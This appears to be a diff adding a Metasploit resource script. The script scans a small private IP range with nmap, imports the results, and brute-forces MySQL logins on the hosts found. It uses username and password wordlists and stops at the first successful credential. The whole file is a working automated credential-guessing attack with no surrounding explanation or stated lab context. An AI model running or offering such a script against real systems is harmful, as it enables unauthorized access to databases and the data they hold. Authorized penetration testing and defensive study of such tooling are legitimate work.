@@ -1,0 +1,14 @@
+workspace -d AUTOSCAN
+workspace -a AUTOSCAN
+nmap -F 10.202.208.1-10 -oA checking2
+db_import checking2.xml
+use auxiliary/scanner/mysql/mysql_login
+services -S mysql -R
+
+set USER_FILE ./Usernames.txt
+set PASS_FILE ./Passwords.txt
+set THREADS 10
+set STOP_ON_SUCCESS True
+spool mylog.log
+run
+exit
